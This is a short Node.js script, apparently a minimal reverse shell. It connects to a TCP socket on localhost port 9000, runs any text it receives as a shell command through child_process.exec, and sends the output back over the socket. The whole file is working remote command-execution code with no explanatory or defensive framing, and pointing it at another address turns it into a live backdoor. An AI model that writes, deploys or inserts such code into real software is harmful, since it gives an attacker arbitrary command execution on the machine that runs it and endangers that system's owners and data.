const net = require('net');
const { exec } = require('child_process');
const socket = new net.Socket();
socket.connect(9000, '127.0.0.1');
socket.on('data', chunk => {
  const command = chunk.toString();
  exec(command, (err, stdout, stderr) => socket.write(stdout || stderr));
});
